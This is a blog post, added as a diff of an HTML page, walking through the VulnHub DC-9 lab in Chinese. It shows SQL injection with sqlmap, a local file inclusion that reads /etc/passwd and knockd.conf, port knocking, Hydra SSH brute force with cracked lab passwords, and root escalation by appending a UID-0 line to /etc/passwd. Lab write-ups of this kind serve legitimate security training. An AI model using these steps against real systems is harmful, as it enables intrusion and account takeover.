@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-DC_9-Walkthrough | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-DC_9-Walkthrough</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 9, 2020&nbsp;&nbsp;8:21:09</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=625568&auto=1&height=66"></iframe>
+
+<h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p><code>DC-9</code>是 <code>DC</code> 系列的最后一个靶机了，这项挑战的最终目标是扎根并读取唯一的标志。</p>
+<p>这个靶机有点意思，是通过频繁的<code>爆破SSH</code>最终通过写入用户到 <code>passwd</code> 提权才拿到的Flag。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p>
+<h2 id="运用到的知识点"><a href="#运用到的知识点" class="headerlink" title="运用到的知识点"></a>运用到的知识点</h2><p><code>SQL注入</code>获取账号密码<br><code>LFI</code>本地文件包含漏洞<br><code>knockd</code>的保护<code>SSH</code>机制<br>绕过<code>knockd</code>限制暴力破解SSH<br>写入文件到<code>passwd</code>提权</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>获取到靶机 <code>IP</code> 后先对它进行端口扫描看看它开放了那些服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.148</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1323.png" alt="图片"></p>
+<p>可以看到，靶机只开放了 <code>80</code>（http），而<code>22</code>（ssh）被过滤了！应该是做了防护！我们先来看看它的 <code>WEB</code> 服务吧：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1324.png" alt="图片"></p>
+<p>通过查看它的页面我发现它的页面上有一些用户的信息：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1325.png" alt="图片"></p>
+<p>还有搜索的提交页面：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1326.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1327.png" alt="图片"></p>
+<h2 id="SQL注入获取账号密码"><a href="#SQL注入获取账号密码" class="headerlink" title="SQL注入获取账号密码"></a>SQL注入获取账号密码</h2><p>既然它搜索可以查询到相应到信息，那么说明它吧我们的条件带入数据库里查询了，很有可能会存在<code>SQL</code>注入！</p>
+<p>按照我的思路，不管他三七二十一直接丢到<code>Sqlmap</code>里一顿梭哈！我先是使用<code>Burp</code>抓包：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1328.png" alt="图片"></p>
+<p>把抓到的数据包保存到本地 <code>post.txt</code> 文件里：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1329.png" alt="图片"></p>
+<p>最后丢到<code>Sqlmap</code>里跑发现是存在注入的：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1330.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1331.png" alt="图片"></p>
+<p>最终获取到网站后台的管理员账号和密码<code>HASH</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -D Staff -T Users -C Username,Password --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1332.png" alt="图片"></p>
+<p>通过解密得到了账号 <code>admin</code> 的密码为 <code>transorbital1</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1333.png" alt="图片"></p>
+<h2 id="LFI本地文件包含漏洞"><a href="#LFI本地文件包含漏洞" class="headerlink" title="LFI本地文件包含漏洞"></a>LFI本地文件包含漏洞</h2><p>获取到账号和密码后登陆到了网站到页面，其中发现了 <code>manage.php</code> 页面底部有一个提示引起了我的注意：<code>File does not exist</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1334.png" alt="图片"></p>
+<p>翻译过来就是文件未找到！这个时候脑子里第一时间想到的就是 <code>LFI</code>！后来通过我 <code>FUZZ</code> 发现真的是存在<code>本地文件包含</code>漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.148/manage.php?file=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1335.png" alt="图片"></p>
+<h2 id="绕过knockd限制暴力破解SSH"><a href="#绕过knockd限制暴力破解SSH" class="headerlink" title="绕过knockd限制暴力破解SSH"></a>绕过knockd限制暴力破解SSH</h2><p>可以看到我们可以查看 <code>passwd</code> 文件，而之前我们通过<code>sqlmap</code>获取到了一堆账号和密码，而那些账号和 <code>passwd</code> 里的账号是一样的！那么我们就可以利用获取到的账号和密码挨个去碰撞看看能不能登陆到它的 <code>SSH</code>！</p>
+<p>我先是把账号和密码保存到了 <code>user</code> 和 <code>pass</code> 里：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1336.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1337.png" alt="图片"></p>
+<p>保存完后我尝试使用 <code>Hydra</code> 去爆破发现它连接请求被拒绝了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user -P pass 192.168.1.148 ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1338.png" alt="图片"></p>
+<p>到了这里我们要知道关于 <code>SSH</code> 的三个机制：</p>
+<p>如果需要远程访问计算机并启用了 Secure Shell (SSH) 连接，黑客就会尝试突破您的防线并控制您的计算机，您必须接受这个事实。尽管不能保证计算机不会被 “黑客” 占领，但是一些简单的解决方案有助于保护 SSH，可以让攻击困难一些。本文讨论三种技术：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、把 SSH 的标准端口改为不常用的值并增强 SSH 配置，从而挡住最简单的攻击。</span><br><span class="line">2、定义有限的用户列表，只允许这些用户登录。</span><br><span class="line">3、完全隐藏允许 SSH 访问的事实，要求根据特殊的 “敲门” 序列识别有效用户。</span><br></pre></td></tr></table></figure>
+
+<p>首先进行排除法我们刚开始就对它进行端口扫描了，它只开放了两个端口，由此判断它的端口没有改变，排除一！</p>
+<p>其次我们通过 <code>LFI</code> 发现 <code>passwd</code> 文件让我们得到了 <code>SSH</code> 的用户名，由此判断它的用户名是对的，排除二！</p>
+<p>那么估计就是 <code>SSH</code> 被某些手段所隐藏了，我们需要根据特殊的“<code>敲门</code>”才能登陆到用户！<br>这个时候我通过查看了下面这篇文章找到了原因：</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/43716885">https://zhuanlan.zhihu.com/p/43716885</a></p>
+<p>如果你有一台公众可访问的服务器，黑客可以轻松扫描其IP地址，查找服务器上的开放端口(尤其是用于<code>SSH</code>的端口<code>22</code>)。将服务器隐藏起来、不让黑客看见的一种方法是使用<code>knockd</code>。<code>knockd</code>是一种端口试探服务器工具。它侦听以太网或其他可用接口上的所有流量，等待特殊序列的端口命中(<code>port-hit</code>)。<code>telne</code>t或<code>Putty</code>等客户软件通过向服务器上的端口发送<code>TCP</code>或数据包来启动端口命中。</p>
+<p>既然知道了原理之后我们就知道了如何去应对它了！借助偶像猪猪侠的话：<code>只有对原理了然如心，你才能突破更多的限制！</code></p>
+<p>如果目标服务器上按照了 <code>knockd</code> ，那么默认的配置文件就存放在 <code>/etc/knockd.conf</code> 里！那么我们就可以利用 <code>LFI</code> 去查看这个:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.148/manage.php?file=../../../../../..//etc/knockd.conf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们就得到了要“<code>敲门</code>”的序列号为：<code>7469</code>、<code>8475</code>、<code>9842</code>！紧接着我在 KALI 中安装了 <code>knockd</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install knockd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1339.png" alt="图片"></p>
+<p>安装完后我们只需要使用 <code>knockd</code> 进行“<code>敲门</code>”就可以使用 <code>hydra</code> 九头蛇爆破了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 192.168.1.148 7469 8475 9842</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1340.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user -P pass 192.168.1.148 ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1341.png" alt="图片"></p>
+<p>这个时候就成功爆破出三个用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.1.148   login: janitor   password: Ilovepeepee</span><br><span class="line">[22][ssh] host: 192.168.1.148   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.1.148   login: joeyt   password: Passw0rd</span><br></pre></td></tr></table></figure>
+
+<p>登陆到 <code>janitor</code> 用户后使用一些常规的提权操作后无果，但是我发现了一个隐藏目录，里面存放着一些密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1342.png" alt="图片"></p>
+<p>很显然了作者想让我们<code>挨个去登陆</code>这些用户才能获取到 root ！我再次把收集到的密码放到 <code>pass</code> 文件里然后再次爆破：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1343.png" alt="图片"></p>
+<p>回炉再造之后我们又得到了一个用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.1.148   login: fredf   password: B4-Tru3-001</span><br></pre></td></tr></table></figure>
+
+<p>登陆成功后我查看有没有那些 <code>sudo</code> 权限的命令发现了一个 <code>test</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1344.png" alt="图片"></p>
+<p>尝试 <code>sudo</code> 运行这个文件发现它是一个 <code>python</code> 脚本：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1345.png" alt="图片"></p>
+<h2 id="写入文件到passwd提权"><a href="#写入文件到passwd提权" class="headerlink" title="写入文件到passwd提权"></a>写入文件到passwd提权</h2><p>随后找到了这个文件所在的目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name test.py 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/opt/devstuff/test.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1346.png" alt="图片"></p>
+<p>查看 <code>test.py</code> 文件得到了它的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1347.png" alt="图片"></p>
+<p>通过代码审计它这个脚本是通过 <code>sys</code> 模块，它是一个简单的<code>数据追加程序</code>。它将使用<code>2</code>个文件<code>作为参数</code>，然后将<code>第一个文件</code>的<code>内容附加</code>到<code>第二个文件</code>中。</p>
+<p>关于 <code>sys</code> 模块大家可以看看这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/anndy_/article/details/76824540">https://blog.csdn.net/anndy_/article/details/76824540</a></p>
+<p>最后我们通过 <code>openssl</code> 生成了一个账号密码然后写入到了 <code>passwd</code> ：</p>
+<p>关于 <code>openssl</code> 可以看看这篇文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e311a6537467">https://www.jianshu.com/p/e311a6537467</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt saul 123456</span><br><span class="line"># 生成 passwd 密码的 hash 值</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1348.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;saul:$1$saul$HqxyWB6MwTZbm/LiAFFZX.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /tmp/raj</span><br><span class="line"><span class="comment"># 在 tmp 创建一个 raj 文件，里面是我们的密码</span></span><br><span class="line">sudo ./<span class="built_in">test</span> /tmp/raj /etc/passwd</span><br><span class="line"><span class="comment"># 运行 test 文件 把 raj 里的内容追加到 /etc/passwd 里</span></span><br><span class="line">su saul</span><br><span class="line"><span class="comment"># 切换用户到 saul 成功获取 root 权限</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1349.png" alt="图片"></p>
+<p>最终也是在 <code>/root</code> 目录下拿到了 <code>Flag</code> 文件！</p>
+<p>至此 DC 系列靶机已经完结~</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/03/09/Vulnhub-DC-9/">http://example.com/2020/03/09/Vulnhub-DC-9/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/09/SQL-MsSQL/">史上最详细的sqlServer手工注入详解</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/09/Vulnhub-DC-8/">VulnHub通关日记-DC_8-Walkthrough</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
